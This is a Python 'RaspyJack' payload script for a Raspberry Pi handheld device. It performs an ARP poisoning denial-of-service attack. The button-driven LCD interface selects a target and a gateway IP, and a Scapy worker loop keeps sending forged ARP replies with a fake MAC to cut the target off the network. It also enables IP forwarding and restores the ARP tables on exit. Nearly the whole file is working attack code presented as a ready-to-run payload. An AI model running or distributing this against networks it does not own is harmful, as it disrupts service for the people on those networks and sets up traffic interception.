#!/usr/bin/env python3
"""
RaspyJack *payload* – **ARP Poisoning DoS Attack**
================================================
This payload performs an ARP Poisoning Denial of Service (DoS) attack.
It spoofs ARP replies to redirect traffic between a target IP and the
gateway IP, effectively cutting off the target's network access.

Features:
- Interactive UI for entering target and gateway IP addresses.
- Uses Scapy to send spoofed ARP packets.
- Displays current status (ACTIVE/STOPPED) on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring ARP tables are restored.
- Dynamically determines the active network interface.

Controls:
- MAIN SCREEN:
    - OK: Start ARP Poisoning.
    - KEY1: Edit Target IP.
    - KEY2: Edit Gateway IP.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- ATTACKING SCREEN:
    - KEY3: Stop Attack and Exit.
"""

import sys
import os
import time
import signal
import subprocess
import threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import raspyjack_integration as rji
from scapy.all import Ether, ARP, send, srp, conf
conf.verb = 0

TARGET_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"
FAKE_MAC = "00:11:22:33:44:55" # MAC address to use for spoofing

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
status_msg = "Press OK to start"
current_ip_input = ""
ip_input_cursor_pos = 0
current_ip_type = ""
ATTACK_INTERFACE = None
IP_FORWARDING_ENABLED_BY_US = False

def cleanup(*_):
    global running, ATTACK_INTERFACE, IP_FORWARDING_ENABLED_BY_US
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2) # Wait for the thread to finish
        
        if ATTACK_INTERFACE:
            draw_ui(screen_state="cleaning", message_lines=["Restoring ARP..."])
            restore_arp_tables(ATTACK_INTERFACE)
        
        if IP_FORWARDING_ENABLED_BY_US:
            try:
                subprocess.run("sysctl -w net.ipv4.ip_forward=0", shell=True, check=True, capture_output=True)
                print("IP forwarding disabled.", file=sys.stderr)
            except Exception as e:
                print(f"Error disabling IP forwarding: {e}", file=sys.stderr)
        
        print("ARP Poison DoS cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "ARP Poison DoS", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Gateway IP:", font=FONT, fill="white")
        d.text((5, 80), GATEWAY_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "OK=Start | KEY1=Target | KEY2=Gateway", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "select_ip_type":
        d.text((5, 40), "Select IP to Edit:", font=FONT, fill="white")
        d.text((5, 60), "KEY1: Target IP", font=FONT, fill="yellow")
        d.text((5, 75), "KEY2: Gateway IP", font=FONT, fill="yellow")
        d.text((5, 115), "KEY3=Back", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), f"Enter {current_ip_type} IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 40), "ARP Poisoning...", font=FONT_TITLE, fill="red")
        d.text((5, 60), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 75), f"Gateway: {GATEWAY_IP}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "cleaning":
        d.text((5, 50), "Cleaning up...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), message_lines[0] if message_lines else "", font=FONT, fill="white")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.05) # Shorter sleep for responsiveness

    return None

def get_mac(ip, interface):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=interface)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"Error getting MAC for {ip} on {interface}: {e}", file=sys.stderr)
        draw_ui(message_lines=[f"Error getting MAC for {ip}", f"{str(e)[:20]}"])
        time.sleep(3)
    return None

def restore_arp_tables(interface):
    global TARGET_IP, GATEWAY_IP
    if not TARGET_IP or not GATEWAY_IP:
        return
    
    target_mac = get_mac(TARGET_IP, interface)
    gateway_mac = get_mac(GATEWAY_IP, interface)
    
    if target_mac and gateway_mac:
        print(f"Restoring ARP tables for {TARGET_IP} and {GATEWAY_IP}...", file=sys.stderr)
        # Restore target's ARP table
        send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac), iface=interface, count=7, verbose=0)
        # Restore gateway's ARP table
        send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac), iface=interface, count=7, verbose=0)
        print("ARP tables restored.", file=sys.stderr)
    else:
        print("Could not restore ARP tables (MACs not found).", file=sys.stderr)
        draw_ui(message_lines=["Could not restore ARP tables.", "(MACs not found)"])
        time.sleep(3)

def arp_poison_worker(target_ip, gateway_ip, interface):
    global attack_stop_event
    
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    
    if not target_mac:
        print(f"Could not get MAC for target {target_ip}", file=sys.stderr)
        draw_ui(message_lines=[f"Could not get MAC for target {target_ip}"])
        attack_stop_event.set()
        return
    if not gateway_mac:
        print(f"Could not get MAC for gateway {gateway_ip}", file=sys.stderr)
        draw_ui(message_lines=[f"Could not get MAC for gateway {gateway_ip}"])
        attack_stop_event.set()
        return
    
    print(f"Starting ARP poisoning: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac}) on {interface}", file=sys.stderr)
    
    # Craft ARP responses
    # Tell target that we are the gateway
    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=FAKE_MAC)
    # Tell gateway that we are the target
    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=FAKE_MAC)
    
    try:
        while not attack_stop_event.is_set():
            send(packet1, iface=interface, verbose=0)
            send(packet2, iface=interface, verbose=0)
            time.sleep(2)
    except Exception as e:
        print(f"[ERROR] ARP Poisoning worker failed: {e}", file=sys.stderr)
        draw_ui(message_lines=["Attack failed!", f"{str(e)[:20]}"])
        attack_stop_event.set() # Stop the attack on error

def run_attack():
    global status_msg, attack_thread, ATTACK_INTERFACE, IP_FORWARDING_ENABLED_BY_US
    
    interface = rji.get_best_interface()
    if not interface:
        draw_ui(message_lines=["No active network", "interface found!"])
        time.sleep(3)
        return False
    
    ATTACK_INTERFACE = interface
    
    try:
        # Enable IP forwarding
        subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, check=True, capture_output=True)
        IP_FORWARDING_ENABLED_BY_US = True
        print("IP forwarding enabled.", file=sys.stderr)
    except Exception as e:
        print(f"Error enabling IP forwarding: {e}", file=sys.stderr)
        draw_ui(message_lines=["Error enabling IP forwarding!", f"{str(e)[:20]}"])
        time.sleep(3)
        return False

    draw_ui(screen_state="attacking", message_lines=["Starting attack..."])
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=arp_poison_worker, args=(TARGET_IP, GATEWAY_IP, interface), daemon=True)
    attack_thread.start()
    return True

if __name__ == "__main__":
    try:
        # Check if Scapy is installed
        try:
            from scapy.all import Ether
        except ImportError:
            draw_ui(message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        current_screen = "main"
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    if run_attack():
                        current_screen = "attacking"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_type = "target"
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_type = "gateway"
                    current_ip_input = GATEWAY_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    if current_ip_type == "target":
                        TARGET_IP = new_ip
                    elif current_ip_type == "gateway":
                        GATEWAY_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME) # Debounce after IP input
            
            elif current_screen == "attacking":
                draw_ui("attacking")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                time.sleep(0.1) # Shorter sleep while attacking to keep UI responsive

            time.sleep(0.05) # General loop sleep

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("ARP Poison DoS payload finished.")